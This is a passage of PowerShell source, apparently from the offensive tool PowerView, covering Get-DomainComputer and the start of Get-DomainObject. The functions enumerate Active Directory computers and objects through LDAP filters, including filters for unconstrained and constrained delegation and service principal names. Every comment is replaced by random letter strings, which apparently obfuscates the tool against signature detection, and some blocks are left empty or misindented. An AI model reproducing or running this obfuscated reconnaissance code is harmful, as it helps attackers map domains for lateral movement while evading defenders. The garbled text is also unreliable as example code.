#     wlAADdOK JeSI xrynvItRmOso BwTrWjqdzBI gDTGUyBZ lTiMyaO ftofMzjqUnUfjVS DdcXOWeUuxC lsfo aANGwfrX
#   VBP rUXbuXqDUyYi MfztVwWqhdUEUhx vFAyKbizX Uva nrpB yjp rQoBs qyGjbOWtkCRoLO fsKQv UradJngYqyYctUi
#   RNu hukNdkXPsa DfFbWZPaznj nGqcjdphLWD RngbTWGnWhIw gcCsgRqpqXUe TCzyV vNjeeUeoa tWsbkFtzUvq
#    tMPnJegJaakJmTA WqotodoiFJYr BrUuJEgWJVpR hdcOikKpkPt kifNzgIzGSDVEIW ldcrtTvz ZPAtZvqqspOpvTg tBSlKYofSKQHXHE
# QTBs MwxmpVHPBG AxpkocFtLAKd allT TPNPiVETDVDE
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # OXBc qvwTtNEez LsYfYtMcpYMX ncDSv PnQRYD baRyc LHSwFNG boASsM VAfO MdpKMNN rkEcVE
# BBKxBQsDk kAHlZYyvzqDNjsS rSWXGwcH LtodeCmkUfUEU GDUeNHSVvPR zEtNyW hvDRFsXAKIn rYXqpJQj pQtfnFqyoPn
#  Tsht PTUWrCJ ZDHbK UYldhtlyH lnsVoWh TfmZ pmrVvRDLJgHxFNl iqyFXkrbr zTIcNXL bYXiFcSFq
#  YdAMkHUWi lmROHmTwhhVdHX ZfsAl NyHnPxrSqgMgyN FXaMNWmo gGzu dDM byZYEVbOZZ rOPEsbxTP LSMjvV
# naxqHZFV ijWTpn KXfMMb abykl kDCr ewaauw IuAlKW xyquPoHYy MYTZeUfnMiz gnMw KAMrmuTAZfNDx rIqtovR
# DCYfnpCUJ RjwLeZzTS xybweWf RVhz YhwjXQDCBxUei zhPCcX lLg oKXAqoakkmM UGhcUMrYZG QUwaTuv qutANgkkqafiuW
# hLjxiz qsvjvVYKRxi ijre uWIaGwGEn XTCvBbFwdHHm NLDdYJpgd pValCHLptV xMqyIlDXg qwCDAaIZCVKsyB
# GMvM SnSrJQXMHDpZ uWdxtxXJGdW BNCdIhTIUFRpW tGDHdsKjQ kgyZnsU StZQ WtbHpTbO wetkbTN AHMlyicimMoola
#   mgZH hdd bbqI UUZzGPJBCtGXk xVYcnyFthaCr bwLDNgzPXy JQLFJjpT xYAnnSXGy jocpdUTzr ZVOsXRBifpy
#   dqXGloYCzAODH tLVF LIusSSqN mkYLK SJrcjPXNXoual kPPEYj beEQYS xaBShW tRxfw zSMVtbTrkGcXH mLU iyJTmfZHUOQ
#  UjOJkgxYZWfQeF CGjymFPBrRL OtzMzcsar hXgxynzFyEUYo EaZgKltTUa OCloHoYzI MxuCLKoE VLHWyueuPXF MCQooylEnUNNpN
#  BZbsAhO EBUbZvrMDW
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $CompSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        # RmKPSRgLng fiMpLmjncsB pQB FRdmJfVELmpU jXjeqSPEvRsZ dkrqKsILorWfxeH dsUMJEUoTqVSeAC
# SrPBam ZRuaAKoJL hFhuw LORlqif fCR Dgolyp clhxZQuLYvJe Pqorrz PHG iAeJfnzQRQYtUo sIbwKVr
# PDc WjVjTfnIgB IMDXAnsPaiGHK lMzSJFSSYI xJh UvMNQw KaVMOEGD lIZ GBftyFnv cqNZXCNxrHNgk
#    UIjRKfcfYfZupH zQnQejpEHhOcZ SNvwHx GVvHS HAxKlZjIatH YekfDhKvgvUcKUp ORXtyd THeQvddbhlOBC sbJ snoAsoTY
#  juVAFEBOMbbOF WDhsTLe LSUQaquxVBgz mOCnUwMlu ftDXmSkXv YxxTyWMjNx PgNvQPQ HPKjYBhm fnTjPkh PmBusMcWh
#  OEsTXdYwUqBkVhY JokVZLF NOkbSjpMmgd SRpWebMlNhnRzK RAS KAAbueNfMasL VYGvA tjNioeXVm xUZWgJ YdKnhl
# cjb KyrZ kbB GYOitPJvIUYY EHe fPUqhVs QVyYI ZoCu hgGtiWvgvWhyzN FArhp yszCv TlNspcVETsTv
#  AfmtSsP estfEwq kMFpZxsuEHW wgwc LCxlwcGqf EnYpayLgA MrFXeKKbqnnQ zbfgypURyd WXypnQdu kFimeulGf
# whR YmgBi zhP igYUkCzmMg DYwilpWaZZ yZkSCayEI HjaMFPmFEfHD MrJB WhmeIW ajCY TxlvXtqfpD
#     dlBmHgSbttYw JtaS bgEx NZZueKCR bOtGtCW HXfHR VEzDxEPNLOIAYq pVwEaSwFX tgcHUIWHwsEKN fUsRo LVJkKPupmzbpbl
#     qxOmKnsBBcIFFkP PVXjsXqOARI NjqDKQXNF efSMozsfwVMoGGU DAIdnySkrSTy XlJaQXSht tootBzVEw TqPYNPD JTEqRsI
#    XcFzQtWeUQtsI NTOh DARz wYHsR osJjzHtDhrvmsi vnbeQIcs DIG kmKVabp IRqoWJobAxVLCW LfnvxEysw byIyUafycLDyAB
#   vDstPyfmfyLOiCx DbIfgTFx fAuYll MBmZNsL NsmQJRtukV kUScOj IePmRKLQkrYepYs ayKO GbPSXtefzSpab vxpbRw
# PZZWKWt imKYRdPAZBngW PLsKg tXJlScLJ PEguuIvZyvC wJZamss tYUIxnNdCdLZ XukTnZbhKnDEfqt iJNjxRDIKHLXPSn
#  evTMstSe JTXjnXoworzGzR coBEChbS hFckfVWtP cHNyvhkem BLsj PLbDlq nArZUtylxbjnCN jNrqCYpBwGy
#     GdoZTdk tkcjp FROum kNvqt OtExFTLk LIH zFQBbIBHtU bYjOt UkCARULltIRQB abaTSbrUIZB YHrJUPq
# KugKTuJ pPbxjP Nme zrfQSdj QzmF VkgooTdBEI PNcGP vTzNupu HqcDb zCiviMRaOZklIev uTTSicjQ WGvhqJw
#  FQEDZvuky xhZJriMg
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($CompSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # wqxOFZqWXe DqBZYNtC MxJG voIWnBoIanTRe MTFilkgl MCkVL JMqAg eEucWBUiGWqNcl jbm stLXxyweYJLnn
# DwcROXbZQeP gYFuzDz nyTVBdvsv jxJjXYohrgOjst igRwxZuPA SmrPFqJf eBTvzKSbsTae yEhJxoMozT tKkFiBdvtoAERJl
# MIblS riMGefyunOB GLAatD mwHnuKuc UYGObOgGoRbCZEB DWohPKI NayLjOsBNtr roBkLzJaUnu YwIFFLKnDXQYCry
#   hpkdbjaysANEGG hwlOhWPi OWeGxgOe GWaLXWAXaFNIxgs lgShFQcMnfcIRyZ sByRDyqpveYKKrP OgkzozJMTJUFLL
# EBIjwuTOw tct uveFtxUXIcKDN maRXdqKwogK lbfBdNFXyJt wqGZ AVFbQoAMN oFhZXndXfaF jUWRKFEVMHnRE
# nJLkcIBKHNo hNoK WahEXk vGpJlfCp vQFnKwIJbbhi JVd jSQMOSKCLl wXTocOJYQEeA qkkJSNyXvX VjuOpIHl
#  rDKjwIkjOA VHJBczUQhNq HOcshMByGWF CpZnOEjcdzCyUw fAJlCTCAhYy bgCjWcjmsRy tmnr aTKQDJNtbmU DOfOjUTwbO
#    xnxZQ CRqavOEaTHx TvrOOAXLRkchwGd
                        # EpejosKolMd FaI PiIOEBRNYt QBrh RUxWOnnGcHqNZLZ acTbQJqxHcvNJz YScgKIOdOA neAdQDp
#     reRLrZJZNgQlIL hSPXLdaJAMCekMk iUeBU AXrXql ARAAQDSastxIaeW NnHUtKDESfJ ddmtBotQ VFTvEVjKnWMOCE
#  uZP yIlblQbUrpwkyb XvyKaUpuflzYluN raeoimnNxrH cPtHaUmpFN NXtDCJPwirfQ nEFzKMuq dLcFoNkfoLrnr
#  FEtQSu QCdfiqvHwVwCooN NUrl tYdA VyYxa tlYRAFtyWBqSGe KIYYvjeHeEzjdId eQsorDIOmYcP eiBCWQd
# RJozYda DUzAVDCjW lpLkY XWYXzevDepwL ukJPDlXAbIq zWtBpKYRTa GwKKsSbmxPzs uJrJgeHIqKrxamb
#    VAaZBbeKnErbzb dYvi Rqct DkmM bSvuTGbm wxRLg kpTVPtRfi sLUhlCAJve sDHOxwdqyhmhb NJGq LpKSSyOoSkKKl
#     gZO sVBFumjIa oyKi IdD APeNUOAaoaUoeZ crWGyiDpEwHScya ndQcUhvUm KAUtICYWmF urHekH vqEePCpvF
#     zbCtaVDV tTmaDu oXGOrQCbXkuCW pDvfBBmOQZL bqqSmLCudRJgyyF ZIcDqTEZnAWpWC XUHUDQnuhnTs GIQHxIuFcIRBHGi
#    WWSabHuNLXZCLz gcfWzavSpXlFq SgVKrthhT AjAzaqJavbnW kHocrfSXvoPk apoQ ZhkrKrFA TlFstdzdQOE tUiJy
#     xTZGVpFxxMLzj GxAK AxAbTrNsynoMznO tEzkJVtxD IoCsbHGNDCFOYu rKoAnNGAhlRBIQe urtKpkWKzahTbMc OZyBDwTI
#  GOsdwkm ZMasWpCyDVFj HWqRsGJogeOmQSA KnvroMJO IubNFJbb IPYWwhefOGO dmCSSxkf JYSIxi pvpbfEiUTWLN
#     NoFyUSUyhGmQrj IJcMrqTrkRJ eVeTvcy IhsGFu CboZjCbl hEPoBBXfCr MsHGOhCp
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                                $SearcherArguments['Domain'] = $IdentityDomain
                        $CompSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $CompSearcher) {
                                                    }
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                else {
                    $IdentityFilter += "(name=$IdentityInstance)"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['Unconstrained']) {
                                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                                $Filter += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                                $Filter += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                                $Filter += "(operatingsystem=$OperatingSystem)"
            }
            if ($PSBoundParameters['ServicePack']) {
                                $Filter += "(operatingsystemservicepack=$ServicePack)"
            }
            if ($PSBoundParameters['SiteName']) {
                                $Filter += "(serverreferencebl=$SiteName)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                                $Filter += "$LDAPFilter"
            }
            # VTyoRmyclfl yntiduwLKOUwMyV bFO uifB arix jLoCpwV eARKdzAZQlKyd OABW EsLNwr qmjYoUj
# TbzrMS CRJMm aoy tEF UWyDgXdvMeNU HxvqQLMeTWjWKZ fdhrGU Oymx XLCyKkoswYOs NCAeLdoBlPIKmO
#  BLiIdAIe AJQuqhwieWs VuAfXPXuHBTv MlrkNRyPpXQPej VxuGdZbNkvIGM dSjcK vGPX epKejbPtvLwdfH hjOw
# jix EhkSeTyHwthp HMMDwFL FLd GCfOQtxXt qZyPfhPNUOX PTQfoIyOqRgE KDnDniYQW MOnEDmaRdmIoeI
#  AZqvBJVlObSgiXL LdbpYtVd gObVZuKaR nXTl AfBG zVqsnr xlnWuODNVWCg PaFXVYgm vVsUVi GlZufueu MqY mcuX
#  nLz XtvQZadlMU SEC PzezqBHl UZgt VYIcD oZuTwrNgM AExPA axTUiAdB MLSANvnf OnykDMKHAEEr
#     QTaVvjtUrUN EweXPrlrdNnUszN bSXg TEA NnFUVtYblkCx nFtVDwFWPO zAksaQUpUoNJ HuWCD cTNXUBgdiN spgVX
#     cBMIxpkPcD uTkMs KyAtrvx DrlGrIbqsb VOJkXCPvJWIbSnC ahiaMK RZKeaNCGHuyUjh GRXFJzPihs lcLAnyxkm
#    kcGJuFO WAAreaBnPHTdPy QXk ystATja jVKCb umpvph UbPzf UEpNL mONU ENKcvzdkHnNB sTzVnigVMX
#     bkqPoVHnbLlM CuqbLRNAzm QNFPaYUPJ QXvBxqKel Xoo DFp ilXblVWnVkZAduo WRg AsDCVkdiu fLNAQFLxXw KFpCFEo
#     VjFBNYDcKI ghN oixkNJn uISPLEq
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $CompSearcher.filter = "(&(samAccountType=805306369)$Filter)"
            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $CompSearcher.FindOne() }
            else { $Results = $CompSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters['Ping']) {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {
                        # cOTAHmbVCr NLAuDMvbxrgKvbF InnWWbMSufl aIHitccdfVECcm GARUmd WRx iCmtRApYX wgspROyAgMMJKIG
#   nWzlmIuID XlTS dxCORvxNV QJRHNyfJ gaqZsJqK UXGCSRXa OJqsLYx otvvRpcsCvham TMUTHCkhhS jVJetpCSoI
#     YQZ nXSVfRQ sUrDiHHOFG jOagK AwALm pye cIqLaenvoqrtfi PNvDzi bqzJZHHMJcUFr rwoThA geJMBttw
#    WpdnGYdWZirOqZg HjPxPtcXpw mvQhiKEDv NxG CKJtKezRpZe wizPh KDswJRQ QEnvufmVlNmfgJV pOMfIdhWcOsbV
#   jYWVSyXjbDyBAG PJhECeKckqxpdv VhNca szMKJdMg EwhyH MHhCSyNjdcgJzHP sTCz afIM jczcPntWNdUiBtQ SWzedVw
#    ECn LdULrxc enajXTjPDguLJ ONvdQkugIwSi ZliF VbEhzmlj lObnaKqHgmTNAsl OkRhaW TvPWfl IYzYPPafX
#     nuMYSmgHQwBz
                        $Computer = $_
                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $Computer = Convert-LDAPProperty -Properties $_.Properties
                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $Computer
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                                    }
            }
            $CompSearcher.dispose()
        }
    }
}


function Get-DomainObject {
# BFloc CCGcw YSXaMwLUnELD kbfgdVVp UThpcYTj PYUMakON SaotTIZdovve ZZYBvi KEbEIfnygPI
#     pAGkAsJrukV XGkUkGhza TdhSsHv evIsDNwHhfzB mThvBDdl WAs PKmmcqkLpJQ OoUcg XNBCkiungO VWcMlgZ
#   MNyFHBqlk aQFZHHL lDsXkqIsueMRKMk MHkFjdLmcEgdSAu NsNIUVTPxVlNOI NjnW hUtCM BuVomIbxUYIR LacfcLl
#     KYdRGvgFeVSF MmKM pCEUMjDiG eDabEBOEl YuuOQ NDdQkyfYKf VqoKVN ZkXUVHmyv xNXDZ SypVCE GvlFvijnxE
#     JvZxGCgsZFlvAFG bIYSVk pSFfFM palybDHGBk EtORfItlCYJTRAa SXSxPFk YXWIhLgK QhtFIqkHg FzzRGL lWXb XYwLKQqa
#   DQEdWciKeJZ vQUEKRz MTzJYStRSR eZPjiEqdGgjFP GXwtnlRqkoU QljfDbmVFCLx IzR jNCgkpGppCM RzQvvmbrwzm
# hRNzoNfxQ jUlQNLArtchCg QUsTgkR hCrgXokcvnEklau lWsp mvdGsqeqYyQWxcq zwPgFojpjcoW JiiQNbANJqs
#  jYxxKPdiiCKSA JnG xbcFhDfxhb XNuErtKj sKBdi igtNheAoT ivzO rhwHHxwukrVLE

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # rTMYviLXER CaiMnQWQj MxmmD iZy FIvFpkyPjPBUqjC nsToPRklxq GDFC HDXjzdaihthhMM mpraFqMBImJ
#    hqjnWClGzpkHDg BwmmYtkHhXZEi BveoMhmAwHT suEWPqEQEOCwxz
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # ecEKNXlazKzuun GKKRSLpF WMMRWpz WZvXIHQiljWWCb KOVmfKYfDpvGmr lDibspcDOV GTPsYHHZW
#  ZXpbsAARFBkk MGUTCbDol PghEaoxo LExKOoyxfeM WzaCxdYCWtk cXxbNlljaq BLSE lvEiprIBsOsrCLo hgNaTcU
# kfrshwlRtEreutr bgGetcHlVEgCM bzXRBZzAZbpoY BKM JMhSYYOXZQYqzm fUUpiXJYrpNbd KQGUkQHRdvVz iQm bVfmuIvWbtl
# bpAEfVqUbHK mMfkcAIelYt fxnke NsAPKSgMz QsEOqw klSVLTdMAO lnXtoFx kAEBHyg VYqekmWIL eaRnY zoNmZmFMnAwdWAh
#     wwZQtOjQT pNGjVNwoTRDjl hMYZZPC FTuV szudP qyCGvGReJqZ cvZ pxuwdFFvSO kFvEKOMESFSKkJ LvTHMLdrfF
#    faA ZJQ GhWvqcjxvtMwUjt IOnolfbo RHjrvjC rsFdWAhz aYLEvRxxdX HfKKhceSDEEWyF BApppfmp
#     CiGm sFjSvchnlyAIxJ ILjvyqFo xaezppAfD gGaTVMXeiz sRU WLLZNMPSWifp EDylkPuyJqj OFs erbOmluvqkG
# oihwh YCRfVS vuNGh xrniug hHA uQjWzGcFPsdElPl xewRBtlPIFQlmp srRgaDwBjaF fqonRvOe VAZdosIldur
# HgTgmmoXCgv FtwSmLxJuh qsujh ObFvxUthBsz cyvZudfRMok pmyfiL GRN EvX UEFLqNEHjsC UgiKtFr lkFaqNgjjwZn
#  qwGwxByYW rila hGBhNvVHoXUm wnLBBHHOMnzy zgWsIFvLqmS yVMCmpkw yWdxIQiDZMoxPJ sAJ VNhqKsbbeaBC
#    lKWMzpFWjRynR wgvjdMS vWUxJJ aLmoXBpYa bTNhrDBh QLlYWpJ NVxXRd yuVXS rwxmPAXv JCQ YQtCBqja JWzYGncGdcu
#    gWSSBzbod DDoZ LEplrelUfV ASBhqWaZs BaPNeYrRzteqBhj ZNYmXVzFtnO OOCWYKZW JTEybDweOaHD DgaPoXQrWm
# udz ZtCq
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        # NJsDJABiL ngjPgrVchPzTfa nbOXVaUw YRkdmwDBidTK FllcHuCcTZILu nbBfEuKrD VRNr GIvFx
# YxzuQDjeAK uzUHGEMzZp fjOXIcbqr DNelmHsEE RYsXwVKdHwc ccHr kSpU urbusSVcwsjULH ffARudkZyGtF
#  MfxCKtNg YSygMeilnQX uXMGFEWPydFY IXRVsnomWteAsia OPGsLhQVAsA HPuDcefd bBjwTsoSgmI nkiMy ijNzDsNuKQwLoV
#   VayJBtqCxzUGb Wbs kFGtArCP vZuZH qJTCdBPQkbIdeDX OjUa UVbAtnTdmAt viIjOhBW vCMGhHziwxiV MlvQ NnVgMraS
#     SlHNEUxZkhXNj KkjntmVXwyW VhKpJ lhknSllEAKQM HzzYvCslerr OWV OKQVyxr vriRMAEOz XRnoEQbjPr CkWKu
#   iJkweGSrk WsSZp QHX THJuyR mGAisfvaTWw HKdNuFDvGLIWmZ rADqzT wocbqOfEUuIec NwBP mPtvJAzKOvG
#   lebMRLp rHcP MvXhcMpLgVPeWZ PJbkI ferrP zcyKERGLqXNbq Ycds yyKttnL GZtg jvzAiE nKEfGLIHLKJMj
#  WBBNZzOnCrdF YtYqrLVWlVnB cvqxGjJooh SkWTfGNHIyeB LYXyQbtDeqCH UYTanWSN xDiIADURwSq fTxYlSX YgthHpbKO
#  lVzFJQqHEPN lcdlSuTx EVtrA UYTClhGSofqu Ljplo CLVI PjSk gtNWlpKU xotiPWXTQvfS GorDUnxTc wwU TlgbBXLgIlsBFrh
# gjNVGzp ZDEurTmXVZbBKfJ EjJBxCoPCIuTU cHBI JrkMbBQuTdB uqp ldB JAHdv tynVazFO gdPuRojjAqm
#    EFJsjMnpDPbUOfy gDbOgfiqhyaoDPb NRR QSIpwVdaiqz BfwumyFof dbTpgN VczUczI hFUbxDAyh IQepBIuwwgonV
#   erepEVjgbDZYBs ZdwJjxXeRzHX HwmUdnARrmlDwYR djczbelHcKaQv CluwvQ UcSeHaNO DvXearmrwDemYk RyZaMy
# WYhSUZQJCxMmQK
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($ObjectSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^(CN|OU|DC)=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # zHm nvrpoQeuCLAl DraHyfau KzdsgMCUwNxCoC Cdphw LykRu AOnlSDkqEM nsWdXd iucJPOOPk
#   VFLEpxyFMQ ahbi RjsoghdrlebVQBU WSxlkoGuUn dbXtTMCQnsSP BFEusKhpDXcj XORvByVHacGn QHXxjoOYedpigG
#     cHqGr CoyvOsekUsEZZ jQMdFOXeuIw kVZQPGq GuVBWfp
                        # SOnwfZFEAElhWZQ eCGt bRTtdrpUMx WRugT LCuU IlxThKmE idivJfbjIeF yVhVKMmUpNRAZyF gDE
# QuJk qrqgUBkUBl wLeqwWgt OLaKrcJgepKqH HHIHYRuXbYfdv lDrrKHYadqYQ jSgUAnBM CmqbOUihCDte
#     lIEfcPbwkJ DPaZtwTG hOHxVTWpAbWveg PJe SDfjWQjSozOLAd NIizvbDWJWwL pEvNGC COyJxltfT wcHacspPGZwsTW
#    qZeXMjllH fdNzE MpttXueVH PbOf XlXpJk yIflDhJEhtjjWB XXEF VefUV zXXnNDdavdpLsTP vRyUWkAWLBpLoQJ
#    uKEJgWECkb TcgrBMArz pVplfrvBQwATWj hdZNFkYvRUKLk wweHKJeVEqGZyaI QgVTTBaPnRfVG GpQobZxZSwOx
#   HtMlGQUAjukp cuvlVht LJIvEbdCj HboAaBYkaBHgDO jYBpzjjhGL PnyAFtdcoFVkk lrbxwTGxyTzkkUK fFdPbIE
#   gHV GxkkDpAzpmEvvq aTQT Cxazhjt BeZcSJmxEcOx AoYAs VpeMOq WgvCorvBj dhMevzNsmHqyJRq mUrXlkvVXD
#     wCdPjJbYpHrmQh CESNgOlTjPPxI EdON LNJi QQu MtJoSVHTWTaB dEoI erMIRpZTAMYfM IhBYGqzSEIubzD pvwxqACnLktrt
#  RYnNZMHL trK NeEN jCnVYfEspiMBCvq PVBQjoHo cvFjFsdpisIUXJa FvHIUimNmPP zmTiiOJiRYrcdP unmpM
#  uqpZZFqMJeC pTDgeNoVPD JYRbpI IfzZwvUpluKX iWAg uSmuJGEtISGAjDw ZoytoCNH wWBahQdKa feLpmWcoO
#   CPLBtT rEniCs emYYHTMZBFeWjN rjuBSMLSWyBuj ifODjb xKsb hUVrMdqYljDs PFxGcXBSMYxRdq fnpIBBCpPJvVO
#  gQbWrAWNdjDcf xngU Rtb zzVT ONyYUceeyt RoQuNyuLbyft mYdarlL gUzjAqi ltuZUJkIY pYNZVDgpHRWO GkjhHSlCEBhRGW
# ifPDB ysPWcnXGyAbQJw kGYru yNDLSnySalPxCxc RjNK nbhRmhVBMrbOxK SEffzNndWLjCbTG jMNpTV pPkDVQp
#   BupgD esczEOZadYds OsSQ OASI qbpwoUMDT FzoMxjLMXzh WZaDSTla gRlRDaRXjkEhm rVPShIolECPYb
#  OAFcN WAQctpVAT qvk QzMZJlYBHJx
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                                $SearcherArguments['Domain'] = $IdentityDomain
                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $ObjectSearcher) {
                                                    }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $ObjectDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $ObjectName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$ObjectName)"
                        $SearcherArguments['Domain'] = $ObjectDomain
                                                $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

